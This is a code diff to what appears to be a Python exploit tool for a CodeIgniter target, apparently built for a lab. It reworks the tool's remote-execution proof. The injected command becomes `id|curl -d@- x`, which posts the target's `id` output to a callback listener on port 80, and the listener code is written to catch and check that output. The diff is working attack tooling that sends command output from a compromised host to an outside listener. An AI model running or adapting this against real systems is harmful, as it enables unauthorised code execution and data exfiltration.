@@ -110,26 +110,31 @@ class ProfileRegistry:
 
 
 class CallbackProof:
-    """Fresh one-shot HTTP callback used when the app has no writable web path."""
+    """Capture fresh `id` stdout when the app has no writable web path."""
 
-    def __init__(self, bind: str, port: int, token: str) -> None:
+    def __init__(self, bind: str, port: int) -> None:
         self.bind = bind
         self.port = port
-        self.path = f"/{token}"
         self.event = threading.Event()
-        self.source = ""
+        self.output = ""
         owner = self
 
         class Handler(http.server.BaseHTTPRequestHandler):
-            def do_GET(self) -> None:  # noqa: N802 - stdlib callback name
-                if self.path == owner.path:
-                    owner.source = self.client_address[0]
+            def do_POST(self) -> None:  # noqa: N802 - stdlib callback name
+                length = int(self.headers.get("Content-Length", "0"))
+                payload = self.rfile.read(length) if 0 < length <= 4096 else b""
+                if (
+                    self.path == "/"
+                    and re.search(rb"^uid=[0-9]+", payload)
+                    and re.search(rb"\bgid=[0-9]+", payload)
+                ):
+                    owner.output = payload.decode("ascii", errors="replace").strip()
                     owner.event.set()
                     body = b"proof\n"
                     self.send_response(200)
                 else:
-                    body = b"not found\n"
-                    self.send_response(404)
+                    body = b"invalid identity proof\n"
+                    self.send_response(400)
                 self.send_header("Content-Type", "text/plain")
                 self.send_header("Content-Length", str(len(body)))
                 self.end_headers()
@@ -148,7 +153,7 @@ class CallbackProof:
     def wait(self, timeout: float) -> str:
         if not self.event.wait(timeout):
             return ""
-        return f"callback path={self.path} source={self.source}"
+        return f"id stdout: {self.output}"
 
     def close(self) -> None:
         self.server.shutdown()
@@ -1334,13 +1339,13 @@ def parser() -> argparse.ArgumentParser:
     cli.add_argument(
         "--callback-bind",
         default="0.0.0.0",
-        help="listener address for the CodeIgniter callback proof",
+        help="listener address for CodeIgniter's id stdout",
     )
     cli.add_argument(
         "--callback-port",
         type=int,
-        default=8000,
-        help="host callback port reached through the lab's x host alias",
+        default=80,
+        help="host callback port reached through the lab's x host alias (must be 80)",
     )
     return cli
 
@@ -1842,22 +1847,19 @@ def main() -> int:
     args.auto_capture = False
     args.generated_remote_proof = False
     args.generated_callback_proof = False
-    callback_token = ""
-
     if (
         application == "codeigniter"
         and args.command is None
         and proof_path is None
         and not args.fetch
     ):
-        if not 1 <= args.callback_port <= 65535:
-            cli.error("--callback-port must be in the range 1..65535")
-        callback_token = "".join(secrets.choice(session_alphabet) for _ in range(2))
-        args.command = f"curl x:{args.callback_port}/{callback_token}"
+        if args.callback_port != 80:
+            cli.error("CodeIgniter's 14-byte `id` proof requires --callback-port 80")
+        args.command = "id|curl -d@- x"
         args.generated_callback_proof = True
         print(
-            f"[*] callback proof: listen={args.callback_bind}:{args.callback_port} "
-            f"path=/{callback_token}",
+            f"[*] proof command: {args.command}; "
+            f"id stdout listener={args.callback_bind}:{args.callback_port}",
             flush=True,
         )
 
@@ -1958,7 +1960,6 @@ def main() -> int:
             callback = CallbackProof(
                 args.callback_bind,
                 args.callback_port,
-                callback_token,
             )
             callback.start()
         except OSError as exc:
